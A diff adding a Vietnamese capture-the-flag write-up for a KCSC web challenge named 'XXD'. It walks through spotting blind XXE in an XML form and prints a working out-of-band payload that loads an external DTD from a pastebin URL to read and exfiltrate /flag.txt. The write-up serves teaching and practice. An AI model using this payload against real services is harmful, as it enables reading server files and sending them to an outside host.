@@ -128,6 +128,49 @@ Flag: `KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}`
 
 ## XXD
 
+Đề bài: http://146.190.115.228:13373/
+
+Bài này cho 1 form nhập thông tin và Submit
+
+![image](https://user-images.githubusercontent.com/80137840/213668883-c8f23281-cc5b-45cd-ac0a-a735ac4c7531.png)
+
+Thử nhập thông tin và kiểm tra request submit
+
+![image](https://user-images.githubusercontent.com/80137840/213671848-f3b11c8d-224e-4d05-8a45-37299b768a52.png)
+
+Thông tin được gửi đi dưới dạng XML nên khả năng là lỗi XXE. Ngoài ra, response trả về có status = 1 nên đây là blind XXE.
+
+Sau khi thử 1 vài payload trên [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) thì mình thấy có 1 payload khai thác thành công là [XXE OOB with DTD and PHP filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter)
+
+Tạo DTD trên pastebin với flag location là /flag.txt: [maliciousDTD](https://pastebin.com/raw/wUE4Wbyb)
+
+![image](https://user-images.githubusercontent.com/80137840/213678940-a304069f-2215-4c27-b1f6-c7c88a5882d2.png)
+
+Inject đoạn XML vào request gửi lên Server:
+
+```
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "https://pastebin.com/raw/wUE4Wbyb">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+```
+
+![image](https://user-images.githubusercontent.com/80137840/213679485-4bf7c812-f132-42c1-a8db-aed83a167b0a.png)
+
+Và nhận được nội dung file /flag.txt
+
+![image](https://user-images.githubusercontent.com/80137840/213679703-e43d62f7-442f-4ffe-9889-08eeaac4b31d.png)
+
+Decode base64 ta nhận được flag:
+
+![image](https://user-images.githubusercontent.com/80137840/213679811-7b8587dd-8c4c-43b2-993a-7bf987ac401d.png)
+
+Flag: `KCSC{blind_xxD_xxO_xx]_xxe!!@#@}`
+
+
 
 
 
